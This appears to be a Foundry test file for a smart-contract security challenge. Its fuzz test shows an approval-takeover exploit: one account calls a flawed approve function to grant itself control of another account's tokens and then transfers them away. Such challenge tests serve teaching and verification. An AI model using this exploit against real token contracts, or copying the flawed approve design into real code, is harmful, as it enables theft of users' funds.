// SPDX-License-Identifier: CC-BY-NC-SA-4.0
pragma solidity >=0.8.0;

import {Test} from "forge-std/Test.sol";
import {Challenge02} from "../src/Challenge02.sol";

contract Challenge02Test is Test {
    MockChallenge2Token public challenge;
    address public alice = makeAddr("Alice");
    address public bob = makeAddr("Bob");

    function setUp() public {
        challenge = new MockChallenge2Token("Challenge02", "CH02", 18);
        challenge.mint(alice, 420420420420420420);
        challenge.mint(bob, 420420420420420420);
    }

    function test_ApprovalTakeover(uint256 _stolenAmount) public {
        _stolenAmount = bound(_stolenAmount, 1, 420420420420420420);

        vm.startPrank(alice);
        challenge.approve(bob, alice, _stolenAmount); // alice approves bobs tokens to be controlled by themself
        challenge.transferFrom(bob, alice, _stolenAmount); // alice transfers the stolen amount to themself
        vm.stopPrank();

        assertEq(challenge.balanceOf(alice), 420420420420420420 + _stolenAmount);
        assertEq(challenge.balanceOf(bob), 420420420420420420 - _stolenAmount);
    }
}

contract MockChallenge2Token is Challenge02 {
    constructor(string memory name, string memory symbol, uint8 decimals) Challenge02(name, symbol, decimals) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) public {
        _burn(from, amount);
    }
}
